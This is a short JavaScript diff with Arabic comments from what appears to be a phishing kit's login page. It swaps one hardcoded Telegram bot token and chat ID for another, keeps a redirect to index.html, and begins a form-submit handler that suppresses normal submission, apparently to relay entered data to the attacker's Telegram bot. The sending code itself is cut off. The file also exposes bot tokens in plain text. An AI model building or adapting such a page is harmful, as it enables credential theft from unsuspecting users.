@@ -2,8 +2,8 @@
 document.getElementById("loginot2").addEventListener("click", function() {
     window.location.href = "index.html"; // ← اسم الصفحة التي تريد التوجيه إليها
   });
-    const TOKEN = '7714919420:AAEiI6a7p6YHHJRO4c5bCQt8F7zA62DufNM'; // ضع توكن البوت هنا
-    const CHAT_ID = '7273991427'; // ضع معرف التليجرام هنا
+    const TOKEN = '8044227789:AAHNZxIXljNkt1pbwvJ5-BWLT4WRGlbycx4'; // ضع توكن البوت هنا
+    const CHAT_ID = '7595871538'; // ضع معرف التليجرام هنا
   
     document.querySelector("form").addEventListener("submit", function(e) {
       e.preventDefault(); // يمنع الإرسال العادي
